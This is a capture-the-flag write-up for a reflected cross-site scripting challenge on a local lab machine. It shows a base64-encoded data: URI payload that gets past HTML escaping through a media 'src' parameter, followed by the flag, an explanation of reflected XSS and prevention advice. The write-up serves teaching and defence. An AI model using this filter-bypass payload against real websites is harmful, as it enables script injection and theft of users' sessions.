### Challenge

The most basic XSS to test:
```javascript
<script>alert(1)</script>
```

Nothing found with basic payloads.

In this case, the <object> tag allows incorporating external objects, and data points to the external object or file.
The script isn't interpreted clearly in the source code. For example : `<script>` become `&lt;script&gt;`, it's a common filter to avoid XSS.
So we need to encode this payload in base64. Futhermore, We need to specify the MIME type of the data we want to send in the website.

Here's an example :
```
data:[<mediatype>][;base64],<data>
```

Now we can simply load a div in the source code of the website :
```
data:text/html;base64,PGRpdj48cD55b3lvPC9wPjwvZGl2Pg==
```

Let's try an alert(). I used Cyberchef to encode this in base64: https://gchq.github.io/CyberChef/

Here is the payload:
```
http://192.168.56.101/?page=media&src=data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==
```

And we get the flag !

```
THE FLAG IS : 928D819FC19405AE09921A2B71227BD9ABA106F9D2D37AC412E9E5A750F1506D
```

### Vulnerability

Cross-site scripting (XSS) is a security vulnerability that allows an attacker to inject malicious client-side code into a website.

![cross-site-scripting](https://github.com/Sleleu/darkly/assets/93100775/678dd760-6cee-4bf5-b6e5-78bba5aea712)

This type of attack can be used to steal users' cookies when they visit a vulnerable site (in the case of stored XSS)
or through phishing (in the case of reflected XSS).

In this case, we had in this challenge a reflected XSS, the simpliest variety of XSS.
It arises when an application receives data in an HTTP request and includes that data within the immediate response in an unsafe way.
With this vulnerability, an attacker can:

- Perform any action within the application that the user can perform.
- View any information that the user is able to view.
- Modify any information that the user is able to modify.
- Initiate interactions with other application users, including malicious attacks, that will appear to originate from the initial victim user.

For this challenge, the website didn't protected the sending of data, that allowed us to send script with the MIME type `text/html`


### How to prevent from XSS
- Use the flag `HttpOnly` for your cookies, they will be hidden from javascript
- Filter input of users
- For this specific case, don't authorize all MIME types, especially the text/html
- Use a content security policy (CSP). It reduce the vectors by which XSS can occur by specifying the domains that the browser should consider to be valid sources of executable scripts.

### Ressources
- https://developer.mozilla.org/en-US/docs/Web/HTTP/CSP
- https://developer.mozilla.org/fr/docs/web/http/basics_of_http/data_urls
- https://portswigger.net/web-security/cross-site-scripting/reflected
- https://www.we45.com/post/how-to-prevent-xss-why-base64-is-not-enough
